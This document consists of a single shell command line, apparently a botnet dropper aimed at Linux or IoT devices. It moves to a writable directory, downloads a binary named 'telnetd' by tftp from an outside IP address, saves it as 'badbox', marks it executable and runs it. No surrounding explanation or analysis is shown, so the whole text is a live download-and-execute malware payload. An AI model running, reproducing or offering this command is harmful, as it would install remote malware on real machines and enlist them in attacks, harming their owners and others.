cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 107.173.54.151;cat telnetd >badbox;chmod +x *;./badbox
